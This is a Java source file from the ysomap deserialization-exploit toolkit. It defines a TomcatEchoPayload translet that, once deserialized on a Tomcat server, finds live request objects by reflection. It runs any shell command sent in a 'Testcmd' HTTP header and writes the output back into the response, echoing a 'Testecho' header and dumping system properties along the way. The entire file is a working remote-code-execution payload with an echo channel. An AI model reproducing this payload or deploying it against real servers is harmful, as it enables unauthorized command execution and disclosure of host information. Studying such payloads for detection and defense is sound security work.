package ysomap.core.bullet.jdk.customTranslet;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;

public class TomcatEchoPayload extends AbstractTranslet implements Serializable {

    public TomcatEchoPayload() throws Exception {
        Object o;
        Object resp;
        String s;
        boolean done = false;
        //获取当前所有线程
        Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
        for (int i = 0; i < ts.length; i++) {
            Thread t = ts[i];
            if (t == null) {
                continue;
            }
            s = t.getName();
            if (!s.contains("exec") && s.contains("http")) {
                o = getFV(t, "target");
                //没处理
                if (!(o instanceof Runnable)) {
                    continue;
                }

                //不知道
                try {
                    o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                } catch (Exception e) {
                    continue;
                }

                //最简单的实现，，如果Header中存在Testecho或者Testcmd就朝着全部threads中写入命令执行回显结果
                java.util.List ps = (java.util.List) getFV(o, "processors");
                for (int j = 0; j < ps.size(); j++) {
                    Object p = ps.get(j);
                    o = getFV(p, "req");
                    resp = o.getClass().getMethod("getResponse", new Class[0]).invoke(o);
                    s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testecho"});
                    if (s != null && !s.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Integer(200));
                        resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, "Testecho", s);
                        done = true;
                    }
                    s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testcmd"});
                    if (s != null && !s.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Integer(200));
                        String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", s} : new String[]{"/bin/sh", "-c", s};
                        writeBody(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes());
                        done = true;
                    }
                    if ((s == null || s.isEmpty()) && done) {
                        writeBody(resp, System.getProperties().toString().getBytes());
                    }

                    if (done) {
                        break;
                    }
                }
                if (done) {
                    break;
                }
            }
        }
    }

    //使用org.apache.tomcat.util.buf.ByteChunk的doWrite方法将回显内容写入resp对象内，如果找不到就用java.nio.ByteBuffer来实现
    private static void writeBody(Object resp, byte[] bs) throws Exception {
        Object o;
        Class clazz;
        try {
            clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            o = clazz.newInstance();
            clazz.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class})
                    .invoke(o, bs, new Integer(0), new Integer(bs.length));
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, o);
        } catch (ClassNotFoundException e) {
            clazz = Class.forName("java.nio.ByteBuffer");
            o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, o);
        } catch (NoSuchMethodException e) {
            clazz = Class.forName("java.nio.ByteBuffer");
            o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, o);
        }
    }

    //获取object中的field(s)
    private static Object getFV(Object o, String s) throws Exception {
        java.lang.reflect.Field f = null;
        Class clazz = o.getClass();
        //按照继承树递归查找包含特定名字的field
        while (clazz != Object.class) {
            try {
                f = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (f == null) {
            throw new NoSuchFieldException(s);
        }
        f.setAccessible(true);
        return f.get(o);
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
